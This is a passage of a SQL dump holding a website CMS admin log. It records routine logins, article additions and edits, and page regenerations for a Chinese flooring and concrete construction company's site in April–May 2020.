10:37:06','admin','AddNews','classid=23<br>id=134<br>title=交通安全设施3',1000010000000134,'57106'),(640,'222.210.87.241','2020-04-24 10:37:26','admin','AddNews','classid=23<br>id=135<br>title=交通安全设施4',1000010000000135,'57122'),(641,'222.210.87.241','2020-04-24 10:37:43','admin','AddNews','classid=23<br>id=136<br>title=交通安全设施5',1000010000000136,'57132'),(642,'222.210.87.241','2020-04-24 10:37:57','admin','AddNews','classid=23<br>id=137<br>title=交通安全设施6',1000010000000137,'21229'),(643,'222.210.87.241','2020-04-24 10:38:13','admin','AddNews','classid=23<br>id=138<br>title=交通安全设施7',1000010000000138,'21229'),(644,'222.210.87.241','2020-04-24 10:38:26','admin','AddNews','classid=23<br>id=139<br>title=交通安全设施8',1000010000000139,'57158'),(645,'222.210.87.241','2020-04-24 10:38:46','admin','AddNews','classid=23<br>id=140<br>title=交通安全设施9',1000010000000140,'21257'),(646,'222.210.87.241','2020-04-24 10:39:02','admin','AddNews','classid=23<br>id=141<br>title=交通安全设施10',1000010000000141,'57182'),(647,'222.210.87.241','2020-04-24 10:39:16','admin','AddNews','classid=23<br>id=142<br>title=交通安全设施11',1000010000000142,'57190'),(648,'222.210.87.241','2020-04-24 10:39:31','admin','AddNews','classid=23<br>id=143<br>title=交通安全设施12',1000010000000143,'57202'),(649,'222.210.87.241','2020-04-24 10:39:49','admin','AddNews','classid=23<br>id=144<br>title=交通安全设施13',1000010000000144,'21363'),(650,'222.210.87.241','2020-04-24 10:40:40','admin','AddNews','classid=23<br>id=145<br>title=交通安全设施14',1000010000000145,'21403'),(651,'222.210.87.241','2020-04-24 10:40:59','admin','AddNews','classid=23<br>id=146<br>title=交通安全设施15',1000010000000146,'21419'),(652,'222.210.87.241','2020-04-24 10:45:34','admin','ReListHtml_all','---',0,'57568'),(653,'222.210.87.241','2020-04-24 10:46:36','admin','EditClass','classid=23<br>classname=交通安全设施',0,'57618'),(654,'222.210.87.241','2020-04-24 10:46:48','admin','EditClass','classid=22<br>classname=混凝土激光摊铺整平',0,'21917'),(655,'222.210.87.241','2020-04-24 10:47:15','admin','EditClass','classid=24<br>classname=固化剂地坪',0,'21931'),(656,'222.210.87.241','2020-04-24 10:47:26','admin','ReListHtml_all','---',0,'57642'),(657,'222.210.87.241','2020-04-24 11:12:32','admin','DelNews','classid=18<br>id=116<br>title=遂宁电影院城市广场陶瓷防滑地坪',1000010000000116,'59269'),(658,'222.210.87.241','2020-04-24 11:18:21','admin','AddNews','classid=18<br>id=147<br>title=白塔耍都环氧砂浆地坪案例',1000010000000147,'59434'),(659,'222.210.87.241','2020-04-24 11:19:38','admin','AddNews','classid=18<br>id=148<br>title=车库地坪图',1000010000000148,'24329'),(660,'222.210.87.241','2020-04-24 11:19:47','admin','ReListHtml_all','---',0,'24329'),(661,'222.210.87.241','2020-04-24 11:22:13','admin','AddNews','classid=18<br>id=149<br>title=成都工投国宾总部基地停车场施工案例',1000010000000149,'59615'),(662,'222.210.87.241','2020-04-24 11:24:25','admin','AddNews','classid=18<br>id=150<br>title=成都康师傅方便面厂区环氧自流平施工案例',1000010000000150,'24479'),(663,'222.210.87.241','2020-04-24 11:25:21','admin','AddNews','classid=18<br>id=151<br>title=成都易上OCG施工案例',1000010000000151,'24509'),(664,'222.210.87.241','2020-04-24 11:27:07','admin','AddNews','classid=18<br>id=152<br>title=地材科技馆',1000010000000152,'59760'),(665,'222.210.87.241','2020-04-24 11:27:50','admin','EditNews','classid=18<br>id=147<br>title=白塔耍都环氧砂浆地坪案例',1000010000000147,'24579'),(666,'222.210.87.241','2020-04-24 11:28:01','admin','EditNews','classid=18<br>id=148<br>title=车库地坪图',1000010000000148,'59800'),(667,'222.210.87.241','2020-04-24 11:28:14','admin','EditNews','classid=18<br>id=149<br>title=成都工投国宾总部基地停车场施工案例',1000010000000149,'59811'),(668,'222.210.87.241','2020-04-24 11:28:47','admin','EditNews','classid=18<br>id=150<br>title=成都康师傅方便面厂区环氧自流平施工案例',1000010000000150,'59834'),(669,'222.210.87.241','2020-04-24 11:29:04','admin','EditNews','classid=18<br>id=151<br>title=成都易上OCG施工案例',1000010000000151,'59847'),(670,'222.210.87.241','2020-04-24 11:29:16','admin','EditNews','classid=18<br>id=151<br>title=成都易上OCG施工案例',1000010000000151,'24635'),(671,'222.210.87.241','2020-04-24 11:29:39','admin','EditNews','classid=18<br>id=152<br>title=地材科技馆',1000010000000152,'59866'),(672,'222.210.87.241','2020-04-24 11:31:22','admin','AddNews','classid=18<br>id=153<br>title=金科地产集团整装车库案例',1000010000000153,'59922'),(673,'222.210.87.241','2020-04-24 11:32:14','admin','AddNews','classid=18<br>id=154<br>title=丽邦川东北金融中心接待区环氧彩砂地坪案例',1000010000000154,'24707'),(674,'222.210.87.241','2020-04-24 11:33:00','admin','AddNews','classid=18<br>id=155<br>title=南充市第十中学硅PU球场施工案例',1000010000000155,'24727'),(675,'222.210.87.241','2020-04-24 11:35:23','admin','AddNews','classid=18<br>id=156<br>title=南充市黄金江岸绿道透水路面工程',1000010000000156,'60045'),(676,'222.210.87.241','2020-04-24 11:36:44','admin','AddNews','classid=18<br>id=157<br>title=南充市物流园混泥土激光超平系统案例',1000010000000157,'60083'),(677,'222.210.87.241','2020-04-24 11:38:30','admin','AddNews','classid=18<br>id=158<br>title=山语城EPDM塑胶运动场施工案例',1000010000000158,'60136'),(678,'222.210.87.241','2020-04-24 11:40:17','admin','AddNews','classid=18<br>id=159<br>title=四川外国语学校炳稀酸篮球场地坪施工案例',1000010000000159,'60185'),(679,'222.210.87.241','2020-04-24 11:41:57','admin','AddNews','classid=18<br>id=160<br>title=四川外国语学校悬浮地板篮球球场工程案例',1000010000000160,'60244'),(680,'222.210.87.241','2020-04-24 11:45:38','admin','AddNews','classid=18<br>id=161<br>title=遂宁电影院城市广场陶瓷防滑地坪',1000010000000161,'25111'),(681,'222.210.87.241','2020-04-24 11:46:22','admin','AddNews','classid=18<br>id=162<br>title=遂宁东湖丽景耐磨地坪工程案例',1000010000000162,'25131'),(682,'222.210.87.241','2020-04-24 11:48:26','admin','AddNews','classid=18<br>id=163<br>title=五星小学防刻划环氧自流平案例',1000010000000163,'25169'),(683,'222.210.87.241','2020-04-24 11:51:25','admin','AddNews','classid=18<br>id=164<br>title=重庆巫山神女药业厂区环氧自流平施工案例',1000010000000164,'25271'),(684,'222.210.87.241','2020-04-24 11:51:31','admin','ReListHtml_all','---',0,'25271'),(685,'182.138.226.190','2020-04-29 10:52:03','admin','login','---',0,'24121'),(686,'182.138.226.190','2020-04-29 17:00:52','admin','login','---',0,'62855'),(687,'182.138.226.190','2020-04-29 17:13:25','admin','login','---',0,'63764'),(688,'182.138.226.190','2020-04-29 17:14:12','admin','EditTempvar','varid=2<br>var=footer&amp;gid=1',0,'9813'),(689,'182.138.226.190','2020-04-29 17:32:36','admin','AddNews','classid=18<br>id=165<br>title=遂宁金海国际车库案例',1000010000000165,'65043'),(690,'182.138.226.190','2020-04-29 17:35:45','admin','AddNews','classid=18<br>id=166<br>title=四川兴德红油厂区环氧自流平案例',1000010000000166,'11113'),(691,'182.138.226.190','2020-04-29 17:36:22','admin','ChangeEnewsData','---',0,'65301'),(692,'182.138.226.190','2020-04-29 17:36:27','admin','ReListHtml_all','---',0,'65301'),(693,'182.138.226.190','2020-04-29 17:36:38','admin','DelFcListClass','---',0,'65329'),(694,'110.185.38.87','2020-05-06 10:14:39','admin','login','---',0,'59292'),(695,'110.185.38.87','2020-05-06 10:55:03','admin','EditTempvar','varid=2<br>var=footer&amp;gid=1',0,'50890'),(696,'110.185.38.87','2020-05-06 10:56:01','admin','ReListHtml_all','---',0,'29055'),(697,'110.185.38.87','2020-05-06 10:56:02','admin','ReIndex','---',0,'29055'),(698,'110.185.38.87','2020-05-06 11:03:39','admin','DelNews_all','classid=20<br>classname=荣誉资质&amp;ecms=0',0,'30497'),(699,'110.185.38.87','2020-05-06 11:13:42','admin','AddNews','classid=20<br>id=167<br>title=荣誉1',1000010000000167,'34235'),(700,'110.185.38.87','2020-05-06 11:14:12','admin','AddNews','classid=20<br>id=168<br>title=荣誉2',1000010000000168,'34353'),(701,'110.185.38.87','2020-05-06 11:14:36','admin','AddNews','classid=20<br>id=169<br>title=荣誉3',1000010000000169,'51515'),(702,'110.185.38.87','2020-05-06 11:15:04','admin','EditNews','classid=20<br>id=167<br>title=荣誉1',1000010000000167,'51544'),(703,'110.185.38.87','2020-05-06 11:15:20','admin','EditNews','classid=20<br>id=168<br>title=荣誉2',1000010000000168,'51576'),(704,'110.185.38.87','2020-05-06 11:15:32','admin','EditNews','classid=20<br>id=169<br>title=荣誉3',1000010000000169,'51576'),(705,'110.185.38.87','2020-05-06 11:15:52','admin','EditNews','classid=20<br>id=102<br>title=荣誉4',1000010000000102,'51630'),(706,'110.185.38.87','2020-05-06 11:16:07','admin','EditNews','classid=20<br>id=103<br>title=荣誉5',1000010000000103,'34799'),(707,'110.185.38.87','2020-05-06 11:16:18','admin','EditNews','classid=20<br>id=104<br>title=荣誉6',1000010000000104,'34799'),(708,'110.185.38.87','2020-05-06 11:16:27','admin','EditNews','classid=20<br>id=105<br>title=荣誉7',1000010000000105,'34799'),(709,'110.185.38.87','2020-05-06 11:16:36','admin','EditNews','classid=20<br>id=106<br>title=荣誉8',1000010000000106,'34799'),(710,'110.185.38.87','2020-05-06 11:16:46','admin','EditNews','classid=20<br>id=107<br>title=荣誉9',1000010000000107,'34799'),(711,'110.185.38.87','2020-05-06 11:16:55','admin','EditNews','classid=20<br>id=108<br>title=荣誉10',1000010000000108,'34799'),(712,'110.185.38.87','2020-05-06 11:17:46','admin','ReIndex','---',0,'34977'),(713,'110.185.38.87','2020-05-06 11:17:50','admin','ReListHtml_all','---',0,'34977'),(714,'110.185.38.87','2020-05-06 11:18:46','admin','EditNews','classid=20<br>id=169<br>title=荣誉1',1000010000000169,'35099'),(715,'110.185.38.87','2020-05-06 11:18:54','admin','EditNews','classid=20<br>id=167<br>title=荣誉3',1000010000000167,'35099'),(716,'110.185.38.87','2020-05-06 11:19:05','admin','EditNews','classid=20<br>id=108<br>title=荣誉4',1000010000000108,'35099'),(717,'110.185.38.87','2020-05-06 11:19:16','admin','EditNews','classid=20<br>id=107<br>title=荣誉5',1000010000000107,'51816'),(718,'110.185.38.87','2020-05-06 11:19:25','admin','EditNews','classid=20<br>id=106<br>title=荣誉6',1000010000000106,'51816'),(719,'110.185.38.87','2020-05-06 11:19:35','admin','EditNews','classid=20<br>id=104<br>title=荣誉8',1000010000000104,'51816'),(720,'110.185.38.87','2020-05-06 11:19:45','admin','EditNews','classid=20<br>id=103<br>title=荣誉9',1000010000000103,'51816'),(721,'110.185.38.87','2020-05-06 11:19:54','admin','EditNews','classid=20<br>id=102<br>title=荣誉10',1000010000000102,'51816'),(722,'110.185.38.87','2020-05-06 11:20:15','admin','ReListHtml_all','---',0,'35169'),(723,'118.112.90.135','2020-05-06 13:48:36','admin','login','---',0,'54752'),(724,'118.112.90.135','2020-05-06 13:52:58','admin','EditNews','classid=14<br>id=92<br>title=公司一角',1000010000000092,'54885'),(725,'118.112.90.135','2020-05-06 13:55:17','admin','login','---',0,'55311'),(726,'118.112.90.135','2020-05-06 13:56:50','admin','EditNews','classid=14<br>id=92<br>title=公司一角',1000010000000092,'55098'),(727,'118.112.90.135','2020-05-06 13:57:23','admin','login','---',0,'55543'),(728,'118.112.90.135','2020-05-06 13:58:05','admin','login','---',0,'55126'),(729,'118.112.90.135','2020-05-06 13:59:52','admin','login','---',0,'55434'),(730,'118.112.90.135','2020-05-06 14:03:05','admin','EditNews','classid=14<br>id=92<br>title=公司一角',1000010000000092,'55656'),(731,'118.112.90.135','2020-05-06 14:03:13','admin','ReListHtml_all','---',0,'55656'),(732,'118.112.90.135','2020-05-06 14:03:51','admin','ReListHtml_all','---',0,'56685'),(733,'118.112.90.135','2020-05-06 14:03:55','admin','DelFcListClass','---',0,'56685'),(734,'118.112.90.135','2020-05-06 14:03:59','admin','ChangeEnewsData','---',0,'56685'),(735,'118.112.90.135','2020-05-06 14:04:02','admin','ReClassPath','---',0,'56685'),(736,'118.112.90.135','2020-05-06 14:05:21','admin','EditNews','classid=14<br>id=92<br>title=公司一角',1000010000000092,'56917'),(737,'118.112.90.135','2020-05-06 14:05:28','admin','ReListHtml_all','---',0,'55756'),(738,'118.112.90.135','2020-05-06 14:05:35','admin','ReSpAll','---',0,'56935'),(739,'118.112.90.135','2020-05-06 14:05:37','admin','ChangeEnewsData','---',0,'56935'),(740,'118.112.90.135','2020-05-06 14:05:40','admin','DelFcListClass','---',0,'56935'),(741,'118.112.90.135','2020-05-06 14:05:44','admin','ReClassPath','---',0,'56935'),(742,'118.112.90.135','2020-05-06 14:23:57','admin','ReListHtml_all','---',0,'57774'),(743,'118.112.90.135','2020-05-06 14:24:14','admin','ChangeEnewsData','---',0,'57802'),(744,'118.112.90.135','2020-05-06 14:24:17','admin','DelFcListClass','---',0,'57802'),(745,'118.112.90.135','2020-05-06 14:24:20','admin','ReClassPath','---',0,'57802'),(746,'118.112.90.135','2020-05-06 14:35:27','admin','EditPublicTemp','gid=1',0,'58222'),(747,'118.112.90.135','2020-05-06 14:35:37','admin','ReListHtml_all','---',0,'58231'),(748,'118.112.90.135','2020-05-06 14:35:46','admin','DelFcListClass','---',0,'58240'),(749,'118.112.90.135','2020-05-06 14:35:49','admin','ChangeEnewsData','---',0,'58240'),(750,'118.112.90.135','2020-05-06 14:35:54','admin','ReClassPath','---',0,'58240'),(751,'118.112.90.135','2020-05-06 14:35:58','admin','UpdateClassInfosAll','---',0,'58240'),(752,'118.112.90.135','2020-05-06 14:36:04','admin','ReListHtml_all','---',0,'58240'),(753,'118.112.90.135','2020-05-06 14:40:36','admin','EditPublicTemp','gid=1',0,'58535'),(754,'118.112.90.135','2020-05-06 14:40:43','admin','ReListHtml_all','---',0,'58535'),(755,'118.112.90.135','2020-05-06 14:46:38','admin','EditPublicTemp','gid=1',0,'58930'),(756,'118.112.90.135','2020-05-06 14:46:44','admin','ReListHtml_all','---',0,'58930'),(757,'118.112.90.135','2020-05-06 14:46:48','admin','ReIndex','---',0,'58930'),(758,'118.112.90.135','2020-05-06 14:46:52','admin','ChangeEnewsData','---',0,'58930'),(759,'118.112.90.135','2020-05-06 14:46:55','admin','DelFcListClass','---',0,'58930'),(760,'118.112.90.135','2020-05-06 14:46:59','admin','ReClassPath','---',0,'58930'),(761,'118.112.90.135','2020-05-06 14:47:03','admin','UpdateClassInfosAll','---',0,'58930'),(762,'118.112.90.135','2020-05-06 14:56:55','admin','EditPublicTemp','gid=1',0,'59701'),(763,'118.112.90.135','2020-05-06 14:57:02','admin','ReListHtml_all','---',0,'59701'),(764,'118.112.90.135','2020-05-06 14:57:15','admin','ReIndex','---',0,'59724'),(765,'118.112.90.135','2020-05-06 14:58:41','admin','EditPublicTemp','gid=1',0,'59808'),(766,'118.112.90.135','2020-05-06 14:58:47','admin','ReListHtml_all','---',0,'59808'),(767,'118.112.90.135','2020-05-06 14:58:57','admin','ReIndex','---',0,'59808'),(768,'118.112.90.135','2020-05-06 14:59:01','admin','ChangeEnewsData','---',0,'59808'),(769,'118.112.90.135','2020-05-06 14:59:05','admin','ReClassPath','---',0,'59808'),(770,'118.112.90.135','2020-05-06 14:59:07','admin','DelFcListClass','---',0,'59808'),(771,'118.112.90.135','2020-05-06 14:59:13','admin','UpdateClassInfosAll','---',0,'59808'),(772,'118.112.90.135','2020-05-06 14:59:16','admin','ReUserpageAll','---',0,'59808'),(773,'118.112.90.135','2020-05-06 16:04:37','admin','ReListHtml_all','---',0,'64960'),(774,'118.112.90.135','2020-05-06 16:04:41','admin','ReIndex','---',0,'64960'),(775,'118.112.90.135','2020-05-06 16:04:46','admin','ChangeEnewsData','---',0,'64960'),(776,'118.112.90.135','2020-05-06 16:04:49','admin','DelFcListClass','---',0,'64960'),(777,'118.112.90.135','2020-05-06 16:04:51','admin','DelFcListClass','---',0,'64960'),(778,'118.112.90.135','2020-05-06 16:04:54','admin','ReClassPath','---',0,'64960'),(779,'118.112.90.135','2020-05-06 16:09:35','admin','ReIndex','---',0,'65508'),(780,'118.112.90.135','2020-05-06 16:09:41','admin','ReListHtml_all','---',0,'65508'),(781,'118.112.90.135','2020-05-06 16:09:50','admin','DelFcListClass','---',0,'49164'),(782,'118.112.90.135','2020-05-06 16:09:52','admin','ChangeEnewsData','---',0,'49164'),(783,'118.112.90.135','2020-05-06 16:09:55','admin','ReClassPath','---',0,'49164'),(784,'118.112.90.135','2020-05-06 16:09:58','admin','UpdateClassInfosAll','---',0,'49164'),(785,'118.112.90.135','2020-05-06 16:40:39','admin','ReListHtml_all','---',0,'51414'),(786,'118.112.90.135','2020-05-06 16:46:07','admin','ReListHtml_all','---',0,'51778'),(787,'118.112.90.135','2020-05-06 16:49:49','admin','ReListHtml_all','---',0,'52012'),(788,'118.112.90.135','2020-05-06 16:49:57','admin','ReIndex','---',0,'52012'),(789,'118.112.90.135','2020-05-06 16:50:00','admin','ChangeEnewsData','---',0,'52012'),(790,'118.112.90.135','2020-05-06 16:50:08','admin','DelFcListClass','---',0,'52032'),(791,'118.112.90.135','2020-05-06 17:02:04','admin','ReListHtml_all','---',0,'52846'),(792,'118.112.90.135','2020-05-06 17:02:15','admin','ReIndex','---',0,'52861'),(793,'118.112.90.135','2020-05-06 17:02:18','admin','ChangeEnewsData','---',0,'52861'),(794,'118.112.90.135','2020-05-06 17:02:21','admin','ReClassPath','---',0,'52861'),(795,'118.112.90.135','2020-05-06 17:02:26','admin','UpdateClassInfosAll','---',0,'52861'),(796,'118.112.90.135','2020-05-06 17:03:23','admin','ReDtPage','---',0,'53016'),(797,'118.112.90.135','2020-05-06 17:03:27','admin','ReZtListHtml_all','---',0,'53016'),(798,'118.112.90.135','2020-05-06 17:03:34','admin','ChangeEnewsData','---',0,'53025'),(799,'118.112.90.135','2020-05-06 17:03:37','admin','DelFcListClass','---',0,'53025'),(800,'118.112.90.135','2020-05-06 17:03:41','admin','UpdateClassInfosAll','---',0,'53025'),(801,'118.112.90.135','2020-05-06 17:03:46','admin','ChangeEnewsData','---',0,'53026'),(802,'118.112.90.135','2020-05-06 17:03:51','admin','ReClassPath','---',0,'53026'),(803,'118.112.90.135','2020-05-06 17:03:56','admin','ReDtPage','---',0,'53062'),(804,'118.112.90.135','2020-05-06 17:14:19','admin','ReListHtml_all','---',0,'54435'),(805,'118.112.90.135','2020-05-06 17:14:28','admin','ReIndex','---',0,'54435'),(806,'118.112.90.135','2020-05-06 17:14:32','admin','ReZtListHtml_all','---',0,'54435'),(807,'118.112.90.135','2020-05-06 17:14:35','admin','ChangeEnewsData','---',0,'54435'),(808,'118.112.90.135','2020-05-06 17:14:39','admin','ReClassPath','---',0,'54435'),(809,'118.112.90.135','2020-05-06 17:14:42','admin','DelFcListClass','---',0,'54435'),(810,'118.112.90.135','2020-05-06 17:19:30','admin','ReListHtml_all','---',0,'21953'),(811,'118.112.90.135','2020-05-06 17:19:37','admin','DelFcListClass','---',0,'54759'),(812,'118.112.90.135','2020-05-06 17:19:41','admin','ReClassPath','---',0,'54759'),(813,'118.112.90.135','2020-05-06 17:19:43','admin','ChangeEnewsData','---',0,'54759'),(814,'118.112.90.135','2020-05-06 17:21:39','admin','ReListHtml_all','---',0,'54894'),(815,'118.112.90.135','2020-05-06 17:21:50','admin','ReIndex','---',0,'22147'),(816,'118.112.90.135','2020-05-06 17:21:53','admin','ReClassPath','---',0,'22147'),(817,'118.112.90.135','2020-05-06 17:21:56','admin','ChangeEnewsData','---',0,'22147'),(818,'118.112.90.135','2020-05-06 17:22:02','admin','ReClassPath','---',0,'22147'),(819,'118.112.90.135','2020-05-06 17:25:14','admin','ReListHtml_all','---',0,'55130'),(820,'118.112.90.135','2020-05-06 17:25:18','admin','ChangeEnewsData','---',0,'55129'),(821,'118.112.90.135','2020-05-06 17:25:20','admin','ReClassPath','---',0,'55129'),(822,'118.112.90.135','2020-05-06 17:25:23','admin','DelFcListClass','---',0,'55129'),(823,'118.112.90.135','2020-05-06 17:26:55','admin','ReListHtml_all','---',0,'55238'),(824,'118.112.90.135','2020-05-06 17:30:53','admin','ReListHtml_all','---',0,'55494'),(825,'118.112.90.135','2020-05-06 17:30:56','admin','DelFcListClass','---',0,'55494'),(826,'118.112.90.135','2020-05-06 17:31:01','admin','ChangeEnewsData','---',0,'55494'),(827,'118.112.90.135','2020-05-06 17:35:17','admin','ReListHtml_all','---',0,'55749'),(828,'118.112.90.135','2020-05-06 17:35:33','admin','ChangeEnewsData','---',0,'55749'),(829,'118.112.90.135','2020-05-06 17:35:36','admin','DelFcListClass','---',0,'55749'),(830,'117.176.229.170','2020-05-08 07:10:14','admin','login','---',0,'13679'),(831,'117.176.229.170','2020-05-08 07:21:00','admin','EditPublicTemp','gid=1',0,'13607'),(832,'117.176.229.170','2020-05-08 07:21:05','admin','ReIndex','---',0,'13607'),(833,'117.176.229.170','2020-05-08 07:21:09','admin','ChangeEnewsData','---',0,'13607'),(834,'117.176.229.170','2020-05-08 07:21:12','admin','DelFcListClass','---',0,'13607'),(835,'118.112.90.135','2020-05-08 17:43:05','admin','login','---',0,'52434'),(836,'118.112.90.135','2020-05-08 17:45:14','admin','EditNewstemp','tempid=2<br>tempname=产品内容模板&amp;gid=1',0,'52648'),(837,'118.112.90.135','2020-05-08 17:46:07','admin','ReListHtml_all','---',0,'52696'),(838,'118.112.90.135','2020-05-08 17:46:10','admin','ChangeEnewsData','---',0,'52696'),(839,'118.112.90.135','2020-05-08 17:46:13','admin','DelFcListClass','---',0,'52696'),(840,'118.112.90.135','2020-05-08 17:46:16','admin','ReClassPath','---',0,'52696'),(841,'118.112.90.135','2020-05-08 17:47:10','admin','EditNewstemp','tempid=2<br>tempname=产品内容模板&amp;gid=1',0,'52754'),(842,'118.112.90.135','2020-05-08 17:47:15','admin','ReListHtml_all','---',0,'52754'),(843,'118.112.90.135','2020-05-08 17:47:22','admin','ReZtListHtml_all','---',0,'37595'),(844,'118.112.90.135','2020-05-08 17:47:33','admin','ChangeEnewsData','---',0,'52760'),(845,'118.112.90.135','2020-05-08 17:47:36','admin','ReClassPath','---',0,'52760'),(846,'118.112.90.135','2020-05-08 17:47:39','admin','UpdateClassInfosAll','---',0,'52760'),(847,'118.112.90.135','2020-05-08 17:47:45','admin','ReZtListHtml_all','---',0,'52760'),(848,'118.112.90.135','2020-05-08 18:05:46','admin','DelClass','classid=25<br>classname=透水混凝土',0,'39367'),(849,'118.112.90.135','2020-05-08 18:06:09','admin','AddClass','classid=26<br>classname=透水混凝土',0,'51941'),(850,'118.112.90.135','2020-05-08 18:06:19','admin','ReListHtml_all','---',0,'51964'),(851,'118.112.90.135','2020-05-08 18:06:22','admin','ChangeEnewsData','---',0,'51964'),(852,'118.112.90.135','2020-05-08 18:06:25','admin','ReClassPath','---',0,'51964'),(853,'118.112.90.135','2020-05-08 18:06:27','admin','DelFcListClass','---',0,'51964'),(854,'118.112.90.135','2020-05-09 11:23:49','admin','login','---',0,'62438'),(855,'118.112.90.135','2020-05-09 11:25:12','admin','EditNews','classid=18<br>id=166<br>title=四川兴德红油厂区环氧自流平案例',1000010000000166,'62512'),(856,'118.112.90.135','2020-05-09 11:26:22','admin','EditNews','classid=18<br>id=166<br>title=四川兴德红油厂区环氧自流平案例',1000010000000166,'3433'),(857,'110.185.38.87','2020-05-12 15:11:15','admin','login','---',0,'61953'),(858,'110.185.38.87','2020-05-12 15:13:43','admin','DelNews_all','classid=20<br>classname=荣誉资质&amp;ecms=0',0,'62134'),(859,'110.185.38.87','2020-05-12 15:13:54','admin','EditNews','classid=20<br>id=105<br>title=荣誉4',1000010000000105,'62134'),(860,'110.185.38.87','2020-05-12 15:14:01','admin','EditNews','classid=20<br>id=104<br>title=荣誉5',1000010000000104,'62134'),(861,'110.185.38.87','2020-05-12 15:14:09','admin','EditNews','classid=20<br>id=103<br>title=荣誉6',1000010000000103,'62134'),(862,'110.185.38.87','2020-05-12 15:14:18','admin','EditNews','classid=20<br>id=102<br>title=荣誉7',1000010000000102,'62134'),(863,'110.185.38.87','2020-05-12 15:14:56','admin','DelNews','classid=18<br>id=50<br>title=北京三九制药车间自流平',1000010000000050,'62220'),(864,'110.185.38.87','2020-05-12 15:27:54','admin','AddNews','classid=22<br>id=170<br>title=混凝土激光整平',1000010000000170,'55103'),(865,'110.185.38.87','2020-05-12 15:29:30','admin','DelFcListClass','---',0,'63306'),(866,'110.185.38.87','2020-05-12 15:29:32','admin','ChangeEnewsData','---',0,'63306'),(867,'110.185.38.87','2020-05-12 15:29:35','admin','ReClassPath','---',0,'63306'),(868,'110.185.38.87','2020-05-12 15:31:59','admin','EditNews','classid=22<br>id=170<br>title=混凝土激光整平1',1000010000000170,'63472'),(869,'110.185.38.87','2020-05-12 15:33:30','admin','AddNews','classid=22<br>id=171<br>title=混凝土激光整平2',1000010000000171,'55539'),(870,'110.185.38.87','2020-05-12 15:34:09','admin','AddNews','classid=22<br>id=172<br>title=混凝土激光整平3',1000010000000172,'63607'),(871,'110.185.38.87','2020-05-12 15:34:40','admin','AddNews','classid=22<br>id=173<br>title=混凝土激光整平4',1000010000000173,'63639'),(872,'110.185.38.87','2020-05-12 15:34:49','admin','EditNews','classid=22<br>id=172<br>title=混凝土激光整平3',1000010000000172,'63639'),(873,'110.185.38.87','2020-05-12 15:35:15','admin','ReListHtml_all','---',0,'63678'),(874,'110.185.38.87','2020-05-12 15:35:20','admin','ChangeEnewsData','---',0,'56031'),(875,'110.185.38.87','2020-05-12 15:35:26','admin','ReClassPath','---',0,'56031'),(876,'110.185.38.87','2020-05-12 15:35:28','admin','DelFcListClass','---',0,'56031'),(877,'110.185.38.87','2020-05-12 15:35:34','admin','UpdateClassInfosAll','---',0,'56031'),(878,'110.185.38.87','2020-05-12 15:35:40','admin','ReZtListHtml_all','---',0,'56031'),(879,'110.185.38.87','2020-05-12 15:38:11','admin','DelNews','classid=8<br>id=119<br>title=车库环氧地坪3',1000010000000119,'63878'),(880,'110.185.38.87','2020-05-12 15:38:22','admin','EditNews','classid=8<br>id=120<br>title=车库环氧地坪3',1000010000000120,'63890'),(881,'110.185.38.87','2020-05-12 15:38:32','admin','EditNews','classid=8<br>id=121<br>title=车库环氧地坪4',1000010000000121,'63890'),(882,'110.185.38.87','2020-05-12 15:38:42','admin','EditNews','classid=8<br>id=122<br>title=车库环氧地坪5',1000010000000122,'63890'),(883,'110.185.38.87','2020-05-12 15:38:51','admin','EditNews','classid=8<br>id=123<br>title=车库环氧地坪6',1000010000000123,'63890'),(884,'110.185.38.87','2020-05-12 15:39:00','admin','EditNews','classid=8<br>id=124<br>title=车库环氧地坪7',1000010000000124,'63890'),(885,'110.185.38.87','2020-05-12 15:39:09','admin','EditNews','classid=8<br>id=125<br>title=车库环氧地坪8',1000010000000125,'63890'),(886,'110.185.38.87','2020-05-12 15:39:18','admin','EditNews','classid=8<br>id=126<br>title=车库环氧地坪9',1000010000000126,'63941'),(887,'110.185.38.87','2020-05-12 15:39:27','admin','EditNews','classid=8<br>id=127<br>title=车库环氧地坪10',1000010000000127,'63941'),(888,'110.185.38.87','2020-05-12 15:39:40','admin','ReListHtml_all','---',0,'63964'),(889,'110.185.38.87','2020-05-12 15:39:48','admin','ChangeEnewsData','---',0,'63961'),(890,'110.185.38.87','2020-05-12 15:39:51','admin','ReClassPath','---',0,'63961'),(891,'110.185.38.87','2020-05-12 15:39:54','admin','DelFcListClass','---',0,'63961'),(892,'110.185.38.87','2020-05-12 15:42:29','admin','AddNews','classid=26<br>id=174<br>title=透水混凝土1',1000010000000174,'64139'),(893,'110.185.38.87','2020-05-12 15:43:01','admin','AddNews','classid=26<br>id=175<br>title=透水混凝土2',1000010000000175,'64161'),(894,'110.185.38.87','2020-05-12 15:43:25','admin','AddNews','classid=26<br>id=176<br>title=透水混凝土3',1000010000000176,'64203'),(895,'110.185.38.87','2020-05-12 15:43:49','admin','AddNews','classid=26<br>id=177<br>title=透水混凝土4',1000010000000177,'64217'),(896,'110.185.38.87','2020-05-12 15:44:02','admin','ReListHtml_all','---',0,'64242'),(897,'110.185.38.87','2020-05-12 15:44:07','admin','ChangeEnewsData','---',0,'64242'),(898,'110.185.38.87','2020-05-12 15:47:02','admin','EditNews','classid=18<br>id=166<br>title=四川兴德红油厂区环氧自流平案例',1000010000000166,'64468'),(899,'110.185.38.87','2020-05-12 15:49:22','admin','EditNews','classid=18<br>id=165<br>title=遂宁金海国际车库案例',1000010000000165,'57761'),(900,'110.185.38.87','2020-05-12 15:49:37','admin','ReListHtml_all','---',0,'64658'),(901,'110.185.38.87','2020-05-12 15:49:41','admin','ChangeEnewsData','---',0,'64649'),(902,'110.185.38.87','2020-05-12 15:49:45','admin','ReClassPath','---',0,'64649'),(903,'110.185.38.87','2020-05-12 15:49:48','admin','DelFcListClass','---',0,'64649'),(904,'110.185.38.87','2020-05-12 16:21:54','admin','AddNewstemp','tempid=10<br>tempname=联系我们内容模板&amp;gid=1',0,'50416'),(905,'110.185.38.87','2020-05-12 16:34:55','admin','EditNewstemp','tempid=10<br>tempname=联系我们内容模板&amp;gid=1',0,'51209'),(906,'110.185.38.87','2020-05-12 16:35:17','admin','EditClass','classid=6<br>classname=联系我们',0,'51229'),(907,'110.185.38.87','2020-05-12 16:35:23','admin','ReListHtml_all','---',0,'51229'),(908,'110.185.38.87','2020-05-12 16:35:30','admin','ChangeEnewsData','---',0,'51229'),(909,'110.185.38.87','2020-05-12 16:35:33','admin','ReClassPath','---',0,'51229'),(910,'110.185.38.87','2020-05-12 16:35:35','admin','ReClassPath','---',0,'51229'),(911,'110.185.38.87','2020-05-12 